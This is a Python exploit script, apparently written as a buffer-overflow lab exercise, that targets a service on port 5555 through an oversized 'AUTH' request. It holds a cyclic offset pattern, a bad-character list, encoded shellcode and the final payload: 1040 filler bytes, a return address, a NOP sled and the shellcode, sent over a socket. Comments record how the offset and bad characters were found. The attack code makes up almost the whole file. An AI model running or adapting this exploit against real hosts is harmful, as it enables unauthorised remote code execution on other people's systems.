#!/usr/bin/python
import time, struct, sys
import socket as so

offset =("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi")

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" 
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" 
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" 
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" 
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" 
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" 
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70" 
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" 
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" 
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" 
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" 
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" 
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" 
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" 
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" 
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = ("\xda\xd3\xbd\xa4\x17\xee\xd4\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x31\x6a\x17\x83\xea\xfc\x03\xce\x04\x0c\x21\xf2\xc3\x52"
"\xca\x0a\x14\x33\x42\xef\x25\x73\x30\x64\x15\x43\x32\x28\x9a"
"\x28\x16\xd8\x29\x5c\xbf\xef\x9a\xeb\x99\xde\x1b\x47\xd9\x41"
"\x98\x9a\x0e\xa1\xa1\x54\x43\xa0\xe6\x89\xae\xf0\xbf\xc6\x1d"
"\xe4\xb4\x93\x9d\x8f\x87\x32\xa6\x6c\x5f\x34\x87\x23\xeb\x6f"
"\x07\xc2\x38\x04\x0e\xdc\x5d\x21\xd8\x57\x95\xdd\xdb\xb1\xe7"
"\x1e\x77\xfc\xc7\xec\x89\x39\xef\x0e\xfc\x33\x13\xb2\x07\x80"
"\x69\x68\x8d\x12\xc9\xfb\x35\xfe\xeb\x28\xa3\x75\xe7\x85\xa7"
"\xd1\xe4\x18\x6b\x6a\x10\x90\x8a\xbc\x90\xe2\xa8\x18\xf8\xb1"
"\xd1\x39\xa4\x14\xed\x59\x07\xc8\x4b\x12\xaa\x1d\xe6\x79\xa3"
"\xd2\xcb\x81\x33\x7d\x5b\xf2\x01\x22\xf7\x9c\x29\xab\xd1\x5b"
"\x4d\x86\xa6\xf3\xb0\x29\xd7\xda\x76\x7d\x87\x74\x5e\xfe\x4c"
"\x84\x5f\x2b\xc2\xd4\xcf\x84\xa3\x84\xaf\x74\x4c\xce\x3f\xaa"
"\x6c\xf1\x95\xc3\x07\x08\x7e\xe6\xdc\x12\x13\x9e\xe0\x12\xfa"
"\x02\x6c\xf4\x96\xaa\x38\xaf\x0e\x52\x61\x3b\xae\x9b\xbf\x46"
"\xf0\x10\x4c\xb7\xbf\xd0\x39\xab\x28\x11\x74\x91\xff\x2e\xa2"
"\xbd\x9c\xbd\x29\x3d\xea\xdd\xe5\x6a\xbb\x10\xfc\xfe\x51\x0a"
"\x56\x1c\xa8\xca\x91\xa4\x77\x2f\x1f\x25\xf5\x0b\x3b\x35\xc3"
"\x94\x07\x61\x9b\xc2\xd1\xdf\x5d\xbd\x93\x89\x37\x12\x7a\x5d"
"\xc1\x58\xbd\x1b\xce\xb4\x4b\xc3\x7f\x61\x0a\xfc\xb0\xe5\x9a"
"\x85\xac\x95\x65\x5c\x75\xb5\x87\x74\x80\x5e\x1e\x1d\x29\x03"
"\xa1\xc8\x6e\x3a\x22\xf8\x0e\xb9\x3a\x89\x0b\x85\xfc\x62\x66"
"\x96\x68\x84\xd5\x97\xb8")

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

#req1 = "AUTH " + offset + "\x71\x1d\xd1\x65" + "C" * 402  # Found the offset at 1040 
# this is from the prginal script -> "\x41"*1072
#req1 = "AUTH " + shellcode + "B" * 4  + badchars # Looked for badchars.. only ond seem to be \x00

req1 = "AUTH " + "C" * 1040  + "\x71\x1d\xd1\x65" + "\x90" * 8  + shellcode

s = so.socket(so.AF_INET, so.SOCK_STREAM)

try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
